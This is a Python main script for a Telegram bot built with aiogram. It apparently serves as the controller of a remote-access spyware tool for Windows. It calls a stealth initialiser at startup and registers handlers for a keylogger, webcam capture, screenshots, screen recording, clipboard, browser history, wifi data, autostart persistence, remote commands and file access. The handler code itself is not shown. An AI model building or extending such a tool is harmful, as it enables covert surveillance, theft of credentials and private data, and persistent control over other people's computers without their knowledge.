import asyncio
import logging
import sys

if sys.platform == "win32":
    from stealth_init import init_stealth
    init_stealth()

from aiogram import Bot, Dispatcher
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from config import BOT_TOKEN
from middleware import AuthMiddleware
from handlers import (basic, screenshot, system_info, commands, files,
                      processes, power, volume, screen_record, notifications,
                      clipboard, webcam, url, keylogger, mouse, wifi, scheduler,
                      graph, internet, media, display, autostart, winget, chat,
                      stealth, browser_history, wallpaper, voice_play,
                      mouse_prank, mouse_swap)

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())

dp.message.middleware(AuthMiddleware())
dp.callback_query.middleware(AuthMiddleware())

dp.include_router(basic.router)
dp.include_router(screenshot.router)
dp.include_router(system_info.router)
dp.include_router(commands.router)
dp.include_router(files.router)
dp.include_router(processes.router)
dp.include_router(power.router)
dp.include_router(volume.router)
dp.include_router(screen_record.router)
dp.include_router(notifications.router)
dp.include_router(clipboard.router)
dp.include_router(webcam.router)
dp.include_router(url.router)
dp.include_router(keylogger.router)
dp.include_router(mouse.router)
dp.include_router(wifi.router)
dp.include_router(scheduler.router)
dp.include_router(graph.router)
dp.include_router(internet.router)
dp.include_router(media.router)
dp.include_router(display.router)
dp.include_router(autostart.router)
dp.include_router(winget.router)
dp.include_router(browser_history.router)
dp.include_router(wallpaper.router)
dp.include_router(voice_play.router)
dp.include_router(mouse_prank.router)
dp.include_router(mouse_swap.router)
dp.include_router(chat.router)
dp.include_router(stealth.router)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
